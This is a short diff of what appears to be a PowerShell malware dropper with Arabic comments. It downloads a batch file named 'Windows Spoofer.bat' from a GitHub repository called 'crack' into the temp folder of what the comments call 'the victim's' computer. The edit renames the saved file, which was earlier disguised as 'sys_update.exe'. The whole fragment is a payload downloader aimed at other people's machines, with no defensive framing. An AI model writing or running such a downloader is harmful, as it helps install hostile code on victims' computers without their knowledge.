@@ -2,7 +2,7 @@
 $url = "https://github.com/9lax/crack/blob/main/Windows%20Spoofer.bat"
 
 # 2. المكان اللي بتنزل فيه التلغيمة في جهاز الضحية (مجلد المؤقتات)
-$path = "$env:temp\sys_update.exe"
+$path = "$env:temp\Windows Spoofer.bat"
 
 # 3. أمر التحميل
 (New-Object System.Net.WebClient).DownloadFile($url, $path)
